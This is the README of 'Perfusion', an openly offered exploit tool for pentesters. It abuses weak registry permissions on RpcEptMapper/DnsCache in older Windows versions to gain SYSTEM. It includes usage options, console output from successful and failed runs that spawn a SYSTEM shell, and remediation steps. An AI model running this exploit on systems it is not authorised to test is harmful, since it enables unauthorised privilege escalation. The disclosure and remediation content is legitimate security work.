# Perfusion

On __Windows 7__, __Windows Server 2008R2__, __Windows 8__, and __Windows Server 2012__, the registry key of the `RpcEptMapper` and `DnsCache` (7/2008R2 only) services is configured with weak permissions. Any local user can create a `Performance` subkey and then leverage the ___Windows Performance Counters___ to load an arbitrary DLL in the context of the WMI service as `NT AUTHORITY\SYSTEM` (hence the tool's name).

This tool is intended to help security consultants during penetration tests. This software is provided as is, and I will probably not provide any support. Though, I tested it thoroughly on three different virtual machines so there should not be any significant issue.

For more information: [https://itm4n.github.io/windows-registry-rpceptmapper-eop/](https://itm4n.github.io/windows-registry-rpceptmapper-eop/)

<p align="center">
  <img src="demo.gif">
</p>

## Known issues

:warning: __READ THIS BEFORE USING THIS TOOL__ :warning:

During the development phase of this tool, I observed __two different behaviors__:

1. The DLL is loaded __directly by the main process__ of the WMI service as `NT AUTHORITY\SYSTEM`, in this case the exploit works perfectly fine.
2. The DLL is loaded __by a subprocess__ of the WMI service that runs as `NT AUTHORITY\LOCAL SERVICE`. In this case, the service loads the DLL __while impersonating the client__. It turns out a privilege escalation is still possible on Windows 7 (because of another vulnerability) but the implementation cost was not worth the effort.

I am not able to explain this difference because my _trigger_ code was always the same. Anyway, in either case, __let the exploit do its job__ so that it can clean everything up when it's done. If the exploit fails, there is still a chance it will work a few minutes or hours later though.

:heavy_check_mark: Here is what you should see when the exploit works:

```console
C:\Temp>Perfusion.exe -c cmd -i
[*] Created Performance DLL: C:\Users\Lab-User\AppData\Local\Temp\performance_2900_368_1.dll
[*] Created Performance registry key.
[*] Triggered Performance data collection.
[+] Exploit completed. Got a SYSTEM token! :)
[*] Waiting for the Trigger Thread to terminate... OK
[*] Deleted Performance registry key.
[*] Deleted Performance DLL.
Microsoft Windows [Version 6.2.9200]
(c) 2012 Microsoft Corporation. All rights reserved.

C:\Temp>whoami
nt authority\system

C:\Temp>
```

:x: Here is what you should see when the exploit fails:

```console
C:\Users\Lab-User\Desktop\workspace>Perfusion.exe -c cmd -i
[*] Created Performance DLL: C:\Users\Lab-User\AppData\Local\Temp\performance_636_3000_1.dll
[*] Created Performance registry key.
[*] Triggered Performance data collection.
[-] Exploit completed but no SYSTEM Token. :/
[*] Waiting for the Trigger Thread to terminate... OK
[*] Deleted Performance registry key.
[*] Deleted Performance DLL.

C:\Temp>
```

## Usage

You can check the help message using the `-h` option.

```console
C:\TOOLS>Perfusion.exe -h
 _____         ___         _
|  _  |___ ___|  _|_ _ ___|_|___ ___
|   __| -_|  _|  _| | |_ -| | . |   |  version 0.1
|__|  |___|_| |_| |___|___|_|___|_|_|  by @itm4n

Description:
  Exploit tool for the RpcEptMapper registry key vulnerability.

Options:
  -c <CMD>  Command - Execute the specified command line
  -i        Interactive - Interact with the process (default: non-interactive)
  -d        Desktop - Spawn a new process on your desktop (default: hidden)
  -h        Help - That's me :)
```

## Remediation

The following versions of Windows are vulnerable:

| Windows version | Vulnerable registry keys |
| --- | --- |
| Windows 7 | RpcEptMapper, DncCache |
| Windows Server 2008R2 | RpcEptMapper, DncCache |
| Windows 8 | RpcEptMapper |
| Windows Server 2012 | RpcEptMapper |

As far as I know, this vulnerability will not be fixed by Microsoft, for some reason. The best solution is still to upgrade to Windows 10 / Server 2019 but if it is not a short-term option, you can still patch this issue yourself by removing the `CreateSubKey` permission for both `NT AUTHORITY\Authenticated Users` and `BUILTIN\Users` on the following registry keys:

- `HKLM\SYSTEM\CurrentControlSet\Services\RpcEptMapper`
- `HKLM\SYSTEM\CurrentControlSet\Services\DnsCache`
